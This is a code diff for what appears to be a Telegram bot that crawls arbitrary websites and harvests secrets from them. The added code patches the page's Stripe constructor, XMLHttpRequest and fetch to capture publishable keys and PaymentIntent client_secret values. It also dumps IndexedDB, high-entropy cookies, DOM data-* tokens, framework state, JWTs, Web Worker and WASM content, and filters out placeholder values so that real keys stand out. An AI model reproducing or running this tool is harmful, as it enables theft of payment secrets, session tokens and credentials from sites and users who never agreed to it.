-    braintreeInits: [], paystackInits: [], flutterwaveInits: [], cashfreeInits: []
+    braintreeInits: [], paystackInits: [], flutterwaveInits: [], cashfreeInits: [],
+    stripeConstructorKeys: [], stripeElementsKeys: [], clientSecrets: []
 };
+
+// ── ENH9A: Stripe constructor hook — new Stripe(key) ──
+(function() {
+    const _p = setInterval(function() {
+        if (window.Stripe && !window.__stripeCtorHooked) {
+            window.__stripeCtorHooked = true;
+            const _OrigStripe = window.Stripe;
+            window.Stripe = function(publishableKey, opts) {
+                try {
+                    if (publishableKey && typeof publishableKey === 'string' && publishableKey.length > 5) {
+                        window.__payHook.stripeConstructorKeys.push({
+                            key: publishableKey,
+                            source: 'new Stripe(key)',
+                            env: publishableKey.includes('_live_') ? 'LIVE' : 'TEST'
+                        });
+                    }
+                } catch(e) {}
+                const instance = new _OrigStripe(publishableKey, opts);
+                // ENH9B: Hook instance.elements() and redirectToCheckout()
+                try {
+                    const _origElements = instance.elements.bind(instance);
+                    instance.elements = function(options) {
+                        try {
+                            if (options && options.clientSecret) {
+                                window.__payHook.clientSecrets.push({
+                                    value: options.clientSecret,
+                                    source: 'stripe.elements({clientSecret})'
+                                });
+                            }
+                        } catch(e) {}
+                        return _origElements(options);
+                    };
+                } catch(e) {}
+                try {
+                    const _origRedir = instance.redirectToCheckout.bind(instance);
+                    instance.redirectToCheckout = function(opts) {
+                        try {
+                            if (opts && opts.sessionId) {
+                                window.__payHook.stripeConstructorKeys.push({
+                                    key: publishableKey,
+                                    sessionId: opts.sessionId,
+                                    source: 'redirectToCheckout({sessionId})',
+                                    env: publishableKey.includes('_live_') ? 'LIVE' : 'TEST'
+                                });
+                            }
+                        } catch(e) {}
+                        return _origRedir(opts);
+                    };
+                } catch(e) {}
+                return instance;
+            };
+            Object.setPrototypeOf(window.Stripe, _OrigStripe);
+            window.Stripe.prototype = _OrigStripe.prototype;
+            clearInterval(_p);
+        }
+    }, 100);
+    setTimeout(() => clearInterval(_p), 20000);
+})();
+
+// ── ENH9C: XHR/fetch response hook — capture client_secret ──
+(function() {
+    // Patch XMLHttpRequest
+    const _origOpen  = XMLHttpRequest.prototype.open;
+    const _origSend  = XMLHttpRequest.prototype.send;
+    XMLHttpRequest.prototype.open = function(method, url) {
+        this.__url = url;
+        return _origOpen.apply(this, arguments);
+    };
+    XMLHttpRequest.prototype.send = function(body) {
+        this.addEventListener('load', function() {
+            try {
+                const text = this.responseText || '';
+                const m = text.match(/"client_secret"\s*:\s*"(pi_[A-Za-z0-9_]{40,200})"/);
+                if (m) {
+                    window.__payHook.clientSecrets.push({
+                        value: m[1], source: 'XHR response: ' + (this.__url||'').substring(0, 80)
+                    });
+                }
+            } catch(e) {}
+        });
+        return _origSend.apply(this, arguments);
+    };
+    // Patch fetch
+    const _origFetch = window.fetch;
+    window.fetch = async function() {
+        const resp = await _origFetch.apply(this, arguments);
+        try {
+            const clone = resp.clone();
+            clone.text().then(function(text) {
+                const m = text.match(/"client_secret"\s*:\s*"(pi_[A-Za-z0-9_]{40,200})"/);
+                if (m) {
+                    window.__payHook.clientSecrets.push({
+                        value: m[1], source: 'fetch response'
+                    });
+                }
+            }).catch(function(){});
+        } catch(e) {}
+        return resp;
+    };
+})();
 
 // ── PaymentRequest hook ──
 (function() {
@@ -9954,6 +10560,25 @@ window.__payHook = {
                         _flw_seen.add(k)
                         result["flutterwave_hits"].append(fw)
                         if progress_cb: progress_cb(f"💳 Flutterwave key: {k[:24]}...")
+                # ENH9: Stripe constructor + client_secret harvest
+                for sc in (hook_data.get("stripeConstructorKeys") or []):
+                    k = sc.get("key","")
+                    if k and k not in _stripe_seen:
+                        _stripe_seen.add(k)
+                        result["stripe_keys"].append({
+                            "value": k,
+                            "source": sc.get("source","new Stripe()"),
+                            "env":    sc.get("env","UNKNOWN"),
+                        })
+                        if progress_cb: progress_cb(f"🔑 Stripe ctor key ({sc.get('env','?')}): {k[:24]}...")
+                for cs in (hook_data.get("clientSecrets") or []):
+                    v = cs.get("value","")
+                    if v:
+                        result.setdefault("client_secrets",[]).append({
+                            "value":  v[:120],
+                            "source": cs.get("source","XHR/fetch hook"),
+                        })
+                        if progress_cb: progress_cb(f"🔑 PaymentIntent client_secret captured")
             except Exception:
                 pass
 
@@ -10102,6 +10727,12 @@ def _paykeys_sync(url: str, progress_cb=None) -> dict:
         _add("Paystack Public Key (dynamic)", ps.get("value","") or ps.get("key",""), ps.get("source","Playwright"))
     for fw in dyn_pw.get("flutterwave_hits", []):
         _add("Flutterwave Public Key (dynamic)", fw.get("value","") or fw.get("public_key",""), fw.get("source","Playwright"))
+    # ENH9: client_secret from XHR/fetch hook — PaymentIntent secret (very high value)
+    for cs in dyn_pw.get("client_secrets", []):
+        v = cs.get("value","")
+        if v:
+            _add("Stripe PaymentIntent client_secret 🔴", v, cs.get("source","Playwright XHR hook"),
+                 confidence="CONFIRMED")
 
     # ── 10. v19: Optional live Stripe key verification ──────────────────────
     stripe_findings = [f for f in findings if "Stripe" in f["type"] and "pk_" in f["value"]]
@@ -11462,6 +12093,11 @@ def _hiddenkeys_sync(url: str, progress_cb=None) -> dict:
         val = str(val).strip()
         key = typ + ":" + val[:80]
         if key not in seen and len(val) >= 6:
+            # ── Phase 1: token quality check ──────────────
+            is_valid, _ = _fp_validate_token(val, name)
+            if not is_valid:
+                return
+            # ──────────────────────────────────────────────
             seen.add(key)
             findings.append({
                 "type": typ,
@@ -11830,6 +12466,165 @@ def _hiddenkeys_sync(url: str, progress_cb=None) -> dict:
                          name=name,
                          confidence="CONFIRMED",
                          extra={"security_flags": ", ".join(attrs) if attrs else "OK"})
+        except Exception:
+            pass
+
+        # ── ENH10: data-* attribute scan ──────────────────────────────────────
+        try:
+            data_attrs = page.evaluate("""() => {
+                const results = [];
+                const attrNames = [
+                    'data-token','data-auth','data-user','data-session',
+                    'data-key','data-nonce','data-csrf','data-xsrf',
+                    'data-api-key','data-access-token','data-bearer',
+                    'data-user-id','data-account','data-identity',
+                ];
+                document.querySelectorAll('*').forEach(el => {
+                    attrNames.forEach(attr => {
+                        const v = el.getAttribute(attr);
+                        if (v && v.length >= 6) {
+                            results.push({
+                                name: attr, value: v,
+                                tag: el.tagName, id: el.id || ''
+                            });
+                        }
+                    });
+                });
+                return results;
+            }""")
+            for item in (data_attrs or []):
+                _add(f"DOM data-* Token ({item.get('name','')})",
+                     item.get("value",""),
+                     f"DOM: <{item.get('tag','?')}> #{item.get('id','')}",
+                     name=item.get("name",""),
+                     confidence="STATIC")
+        except Exception:
+            pass
+
+        # ── ENH11: __INITIAL_STATE__ / Redux / Vuex hydration mining ──────────
+        try:
+            state_tokens = page.evaluate("""() => {
+                const results = [];
+                const stateKeys = [
+                    '__INITIAL_STATE__', '__REDUX_STATE__', '__PRELOADED_STATE__',
+                    '__NEXT_DATA__', '__NUXT__', '__APP_STATE__', '__STORE__',
+                    '__INITIAL_PROPS__', '__RELAY_STORE__',
+                ];
+                const tokenKeys = /token|auth|csrf|session|key|nonce|secret|jwt|bearer/i;
+                stateKeys.forEach(sk => {
+                    try {
+                        const obj = window[sk];
+                        if (!obj) return;
+                        function walk(o, path, depth) {
+                            if (depth > 7 || !o) return;
+                            if (typeof o === 'object') {
+                                Object.keys(o).forEach(k => {
+                                    const v = o[k];
+                                    const fullPath = path + '.' + k;
+                                    if (typeof v === 'string' && v.length >= 8 && tokenKeys.test(k)) {
+                                        results.push({source: sk + fullPath, value: v.substring(0,200), name: k});
+                                    }
+                                    walk(v, fullPath, depth + 1);
+                                });
+                            }
+                        }
+                        try { walk(typeof obj === 'string' ? JSON.parse(obj) : obj, '', 0); }
+                        catch(e) {}
+                    } catch(e) {}
+                });
+                return results;
+            }""")
+            for item in (state_tokens or []):
+                _add("Framework State Token",
+                     item.get("value",""),
+                     item.get("source","window state"),
+                     name=item.get("name",""),
+                     confidence="STATIC")
+        except Exception:
+            pass
+
+        # ── ENH12: Cookie entropy ranking ─────────────────────────────────────
+        try:
+            from math import log2 as _log2
+            all_cookies_ent = ctx.cookies()
+            def _entropy(s):
+                if not s: return 0.0
+                freq = {}
+                for c in s:
+                    freq[c] = freq.get(c, 0) + 1
+                return -sum((v/len(s)) * _log2(v/len(s)) for v in freq.values())
+
+            entropy_cookies = []
+            for cookie in all_cookies_ent:
+                val = cookie.get("value","")
+                if len(val) >= 12:
+                    h = _entropy(val)
+                    if h >= 3.5:
+                        entropy_cookies.append((h, cookie))
+            entropy_cookies.sort(key=lambda x: -x[0])
+
+            for h, cookie in entropy_cookies[:10]:
+                cname = cookie.get("name","")
+                cval  = cookie.get("value","")
+                flags = []
+                if not cookie.get("httpOnly"): flags.append("⚠️ NOT HttpOnly")
+                if not cookie.get("secure"):   flags.append("⚠️ NOT Secure")
+                ss = cookie.get("sameSite","").lower()
+                if ss == "none":  flags.append("⚠️ SameSite=None")
+                elif not ss:      flags.append("⚠️ SameSite=?")
+                is_csrf = any(t in cname.lower() for t in ['csrf','xsrf','token','sess','auth'])
+                _add(f"High-entropy Cookie (H={h:.2f})",
+                     cval[:200],
+                     "Cookie entropy scan",
+                     name=cname,
+                     confidence="CONFIRMED" if is_csrf else "STATIC",
+                     extra={"security_flags": ", ".join(flags) if flags else "OK",
+                            "entropy": round(h, 3)})
+        except Exception:
+            pass
+
+        # ── ENH13: JWT inline decoder ──────────────────────────────────────────
+        try:
+            import base64 as _b64, json as _jd
+            _JWT_RE = re.compile(
+                r'\b(eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,})\b'
+            )
+            def _decode_jwt_hidden(token):
+                try:
+                    parts = token.split(".")
+                    if len(parts) != 3: return None
+                    pad = lambda s: s + "=" * (-len(s) % 4)
+                    header  = _jd.loads(_b64.urlsafe_b64decode(pad(parts[0])))
+                    payload = _jd.loads(_b64.urlsafe_b64decode(pad(parts[1])))
+                    return {"alg": header.get("alg","?"), "typ": header.get("typ","JWT"),
+                            "sub": str(payload.get("sub",""))[:80],
+                            "iss": str(payload.get("iss",""))[:80],
+                            "exp": payload.get("exp",""),
+                            "claims": list(payload.keys())[:12]}
+                except Exception:
+                    return None
+
+            seen_jwt = set()
+            jwt_sources = (
+                [(f.get("value",""), f.get("source","")) for f in findings]
+                + [(c.get("value",""), f"Cookie:{c.get('name','')}") for c in ctx.cookies()]
+            )
+            for val, src in jwt_sources:
+                for m in _JWT_RE.finditer(str(val)):
+                    tok = m.group(1)
+                    if tok in seen_jwt: continue
+                    seen_jwt.add(tok)
+                    decoded = _decode_jwt_hidden(tok)
+                    if decoded:
+                        summary = (f"alg={decoded['alg']} sub={decoded['sub'][:24]} "
+                                   f"iss={decoded['iss'][:24]} "
+                                   f"claims=[{','.join(decoded['claims'][:6])}]")
+                        _add("JWT Token 🔑",
+                             tok[:300],
+                             f"JWT from: {src[:60]}",
+                             name=summary,
+                             confidence="CONFIRMED",
+                             extra={"jwt_decoded": decoded})
         except Exception:
             pass
 
@@ -15867,6 +16662,11 @@ async def cmd_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
             for stype, (pattern, risk) in _SECRET_PATTERNS.items():
                 for match in re.finditer(pattern, content):
                     val = match.group(0)
+                    # ── Phase 1: FP filter ────────────────────────
+                    is_fp, fp_reason = _fp_is_placeholder(val, stype)
+                    if is_fp:
+                        continue
+                    # ─────────────────────────────────────────────
                     # Store FULL value in findings (goes into ZIP report, not Telegram message)
                     dedup_key = stype + val[:40]
                     if dedup_key in seen_keys:
@@ -18394,6 +19194,133 @@ _KD_COMPILED = {
 
 
 # ─── Shannon entropy calculator ───────────────────────────────
+# ═══════════════════════════════════════════════════════════════
+# PHASE 1 — False Positive Reduction Engine
+# Applies to /keydump, /extract, /hiddenkeys
+# ═══════════════════════════════════════════════════════════════
+
+_FP_PLACEHOLDER_EXACT = {
+    "your-api-key", "your_api_key", "your-secret-key", "your_secret_key",
+    "your-secret", "your_secret", "changeme", "replace_me", "insert_here",
+    "example", "placeholder", "dummy", "fake", "mock", "sample", "test",
+    "demo", "xxxx", "xxxxxxxx", "1234567890", "abcdefghijklmnop",
+    "sk-xxxx", "sk_live_xxxx", "pk_live_xxxx",
+    "akia0000000000000000",
+    "aizasyxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
+    "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
+    "xoxb-xxxx", "sg.xxxx", "hf_xxxx",
+    "none", "null", "undefined", "n/a", "na", "test123", "password",
+    "secret", "mysecret", "topsecret", "supersecret",
+}
+
+_FP_PLACEHOLDER_RE = [
+    re.compile(r'^(.)\1{7,}$'),                               # same char ×8+
+    re.compile(r'^[xX0\-_]{8,}$'),                            # x/0/dash only
+    re.compile(r'(?i)(example|placeholder|your[_\-]?key|your[_\-]?secret'
+               r'|insert|replace|changeme|xxxx|dummy|fake|sample'
+               r'|test[_\-]?key|demo[_\-]?key|fake[_\-]?key)'),
+    re.compile(r'^[a-z]{1,6}[0-9]{1,6}$'),                   # simple word+num
+    re.compile(r'^(abc|123|test|demo|fake|null|none|pass)\w{0,10}$', re.I),
+]
+
+# Per-type minimum entropy — tuned per key format
+_FP_ENTROPY_MIN = {
+    "AWS Access Key":    3.2,  # AKIA+16 alphanum — naturally structured
+    "AWS Secret":        4.5,
+    "Stripe Secret":     4.8,
+    "Stripe Public":     4.5,
+    "Google API Key":    3.8,
+    "Firebase Config":   3.8,
+    "GitHub Token":      4.5,
+    "GitLab Token":      4.3,
+    "Slack Token":       4.0,
+    "OpenAI Key":        4.8,
+    "Sendgrid Key":      4.5,
+    "Twilio Key":        3.8,
+    "HuggingFace Token": 3.8,
+    "Telegram Token":    3.2,
+    "Generic Password":  3.0,
+    "Bearer Token":      3.2,
+    "Basic Auth Header": 3.5,
+    "MongoDB URI":       2.5,  # URIs have structure, lower bar
+    "MySQL DSN":         2.5,
+    "Private Key Block": 0.0,  # always real
+    "JWT Token":         4.0,
+    "_default":          3.2,
+}
+
+# Minimum realistic lengths per type
+_FP_MIN_LEN = {
+    "AWS Access Key":   20,
+    "AWS Secret":       30,
+    "Stripe Secret":    30,
+    "OpenAI Key":       40,
+    "Sendgrid Key":     50,
+    "GitHub Token":     36,
+    "GitLab Token":     20,
+    "Google API Key":   35,
+    "_default":         8,
+}
+
+
+def _fp_is_placeholder(value: str, key_type: str = "") -> tuple:
+    """
+    Phase 1 FP filter — returns (is_fp: bool, reason: str).
+    True  = likely false positive → skip.
+    False = looks real → keep.
+    """
+    v = value.strip()
+
+    # Exact known-bad match
+    if v.lower() in _FP_PLACEHOLDER_EXACT:
+        return True, "known placeholder"
+
+    # Regex placeholder patterns
+    for pat in _FP_PLACEHOLDER_RE:
+        if pat.search(v):
+            return True, f"placeholder pattern ({pat.pattern[:35]})"
+
+    # Entropy check (requires entropy function — defined below)
+    try:
+        ent     = _entropy(v)
+        min_ent = _FP_ENTROPY_MIN.get(key_type, _FP_ENTROPY_MIN["_default"])
+        if len(v) >= 12 and ent < min_ent:
+            return True, f"low entropy {ent:.2f} (min {min_ent})"
+    except Exception:
+        pass
+
+    # Minimum length check
+    min_len = _FP_MIN_LEN.get(key_type, _FP_MIN_LEN["_default"])
+    if len(v) < min_len:
+        return True, f"too short ({len(v)} < {min_len})"
+
+    return False, ""
+
+
+def _fp_validate_token(value: str, name: str = "") -> tuple:
+    """
+    /hiddenkeys context-aware token quality check.
+    Returns (is_valid: bool, reason: str).
+    """
+    v = value.strip()
+    if len(v) < 8:
+        return False, "too short"
+    if v.lower() in _FP_PLACEHOLDER_EXACT:
+        return False, "placeholder value"
+    for pat in _FP_PLACEHOLDER_RE:
+        if pat.search(v):
+            return False, "placeholder pattern"
+    try:
+        ent = _entropy(v)
+        if ent < 2.8:
+            return False, f"low entropy {ent:.2f}"
+    except Exception:
+        pass
+    return True, "ok"
+
+
+# ═══════════════════════════════════════════════════════════════
+
 def _entropy(s: str) -> float:
     """Calculate Shannon entropy of a string."""
     import math
@@ -18666,6 +19593,109 @@ def _run_playwright_keydump(url: str) -> dict:
                     return out;
                 }""")
                 findings["window_globals"] = wg or {}
+            except Exception:
+                pass
+
+            # ── ENH7: Web Worker bundle scan ──────────────────────────────────
+            try:
+                workers = page.workers()
+                for worker in workers:
+                    try:
+                        worker_url = worker.url
+                        if not worker_url or not worker_url.startswith("http"):
+                            continue
+                        import urllib.request as _ur
+                        req = _ur.Request(worker_url, headers={"User-Agent": "Mozilla/5.0"})
+                        with _ur.urlopen(req, timeout=6) as resp:
+                            worker_body = resp.read().decode("utf-8", errors="ignore")
+                        if len(worker_body) > 50:
+                            kd_hits = {}
+                            for label, (pat, cat_icon) in _KD_PATTERNS.items():
+                                try:
+                                    raw = re.findall(pat, worker_body, re.IGNORECASE)
+                                except Exception:
+                                    continue
+                                flat = []
+                                for m in raw:
+                                    if isinstance(m, tuple):
+                                        flat.extend([x.strip() for x in m if x and len(x) > 4])
+                                    elif m and len(m) > 4:
+                                        flat.append(m.strip())
+                                if flat:
+                                    kd_hits[f"{label} (worker)"] = list(dict.fromkeys(flat))[:4]
+                            if kd_hits:
+                                findings.setdefault("worker_hits", {})[worker_url[:120]] = kd_hits
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+
+            # ── ENH8: IndexedDB full key-value dump ───────────────────────────
+            try:
+                idb_data = page.evaluate("""async () => {
+                    const result = {};
+                    try {
+                        const dbs = await indexedDB.databases();
+                        for (const dbInfo of dbs) {
+                            if (!dbInfo.name) continue;
+                            const entries = await new Promise((resolve, reject) => {
+                                const req = indexedDB.open(dbInfo.name, dbInfo.version);
+                                req.onsuccess = function() {
+                                    const db = req.result;
+                                    const names = Array.from(db.objectStoreNames);
+                                    const storeData = {};
+                                    let pending = names.length;
+                                    if (!pending) { resolve(storeData); return; }
+                                    names.forEach(storeName => {
+                                        try {
+                                            const tx = db.transaction(storeName, 'readonly');
+                                            const store = tx.objectStore(storeName);
+                                            const all = store.getAll();
+                                            all.onsuccess = function() {
+                                                storeData[storeName] = JSON.stringify(
+                                                    all.result || []
+                                                ).substring(0, 2000);
+                                                if (--pending === 0) resolve(storeData);
+                                            };
+                                            all.onerror = function() {
+                                                if (--pending === 0) resolve(storeData);
+                                            };
+                                        } catch(e) {
+                                            if (--pending === 0) resolve(storeData);
+                                        }
+                                    });
+                                };
+                                req.onerror = () => reject(req.error);
+                                setTimeout(() => resolve({}), 3000);
+                            });
+                            result[dbInfo.name] = entries;
+                        }
+                    } catch(e) {
+                        result.__error__ = String(e);
+                    }
+                    return result;
+                }""")
+                if idb_data and not idb_data.get("__error__"):
+                    findings["indexeddb"] = idb_data
+                    # Scan IDB values for secrets
+                    for db_name, stores in idb_data.items():
+                        if isinstance(stores, dict):
+                            for store_name, values_str in stores.items():
+                                if not values_str:
+                                    continue
+                                kd_hits = {}
+                                for label, (pat, cat_icon) in _KD_PATTERNS.items():
+                                    try:
+                                        raw = re.findall(pat, values_str, re.IGNORECASE)
+                                    except Exception:
+                                        continue
+                                    flat = [x.strip() if not isinstance(x, tuple) else
+                                            next((g.strip() for g in x if g), "") for x in raw]
+                                    flat = [v for v in flat if len(v) > 4]
+                                    if flat:
+                                        kd_hits[f"{label} (idb:{db_name}/{store_name})"] = flat[:4]
+                                if kd_hits:
+                                    findings.setdefault("idb_hits", {}).update(kd_hits)
             except Exception:
                 pass
 
@@ -18945,6 +19975,70 @@ def _run_keydump_sync(url: str) -> dict:
                     )
     except Exception as e:
         out["errors"].append(f"Env probe: {e}")
+
+    # ── ENH5: __NEXT_DATA__ / __NUXT__ deep JSON walk ─────────────────────────
+    try:
+        import json as _json
+        def _walk_json_secrets(obj, path="", depth=0):
+            """Recursively walk JSON and collect high-entropy / pattern-matched values."""
+            if depth > 8 or not obj:
+                return
+            if isinstance(obj, dict):
+                for k, v in obj.items():
+                    _walk_json_secrets(v, f"{path}.{k}", depth + 1)
+            elif isinstance(obj, list):
+                for i, v in enumerate(obj[:20]):
+                    _walk_json_secrets(v, f"{path}[{i}]", depth + 1)
+            elif isinstance(obj, str) and len(obj) > 8:
+                for label, (pat, cat_icon) in _KD_PATTERNS.items():
+                    try:
+                        if re.search(pat, obj, re.IGNORECASE):
+                            bucket = out["by_category"].setdefault(cat_icon, {})
+                            jlabel = f"{label} (__NEXT_DATA__{path})"
+                            bucket.setdefault(jlabel, []).append(obj[:120])
+                    except Exception:
+                        pass
+                # also entropy check
+                try:
+                    from math import log2
+                    freq = {}
+                    for c in obj:
+                        freq[c] = freq.get(c, 0) + 1
+                    entropy = -sum((v/len(obj)) * log2(v/len(obj)) for v in freq.values())
+                    if entropy >= 4.2 and len(obj) >= 16:
+                        out["by_category"].setdefault("🔒", {}).setdefault(
+                            f"High-entropy (__NEXT_DATA__{path})", []
+                        ).append(obj[:120])
+                except Exception:
+                    pass
+
+        # Scan Next.js / Nuxt / generic framework JSON blobs in HTML
+        for pattern_str in [
+            r'<script[^>]+id=["\']__NEXT_DATA__["\'][^>]*>([^<]{10,})<',
+            r'window\.__NUXT__\s*=\s*(\{.*?\})\s*(?:;|</script>)',
+            r'window\.__INITIAL_STATE__\s*=\s*(\{.*?\})\s*(?:;|</script>)',
+            r'window\.__REDUX_STATE__\s*=\s*(\{.*?\})\s*(?:;|</script>)',
+            r'window\.__PRELOADED_STATE__\s*=\s*(\{.*?\})\s*(?:;|</script>)',
+        ]:
+            for m in re.finditer(pattern_str, corpus, re.DOTALL | re.IGNORECASE):
+                try:
+                    blob = _json.loads(m.group(1))
+                    _walk_json_secrets(blob)
+                except Exception:
+                    pass
+    except Exception as e:
+        out["errors"].append(f"NEXT_DATA walk: {e}")
+
+    # ── ENH6: WASM binary secret scan ─────────────────────────────────────────
+    try:
+        wasm_hits = _scan_wasm_secrets(url, data.get("network_log_raw", data.get("js_sources", [])))
+        if wasm_hits:
+            bucket = out["by_category"].setdefault("🔒", {})
+            for wh in wasm_hits:
+                label = f"{wh.get('type','WASM secret')} (wasm)"
+                bucket.setdefault(label, []).append(wh.get("value","")[:80])
+    except Exception as e:
+        out["errors"].append(f"WASM scan: {e}")
 
     # ── 6. Dynamic via Playwright ─────────────────────────────────────────────
     try:
